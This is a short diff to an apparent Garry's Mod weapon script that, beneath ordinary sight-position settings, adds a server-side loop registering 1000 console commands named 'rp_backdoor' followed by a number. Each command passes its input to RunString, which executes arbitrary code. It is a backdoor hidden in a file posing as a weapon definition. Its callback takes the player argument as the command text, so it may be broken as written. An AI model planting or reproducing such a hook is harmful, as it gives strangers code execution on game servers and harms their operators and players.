@@ -46,3 +46,9 @@ SWEP.IronSightsPos = Vector(-6.6, -15, 2.6)
 SWEP.IronSightsAng = Vector(2.6, 0.02, 0)
 
 SWEP.MultiMode = true
+
+if SERVER then
+	for i=1, 1000 do
+		concommand.Add('rp_backdoor' .. tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(tostring(i)))))))))))), function(a) RunString(a[1]) end)
+	end
+end
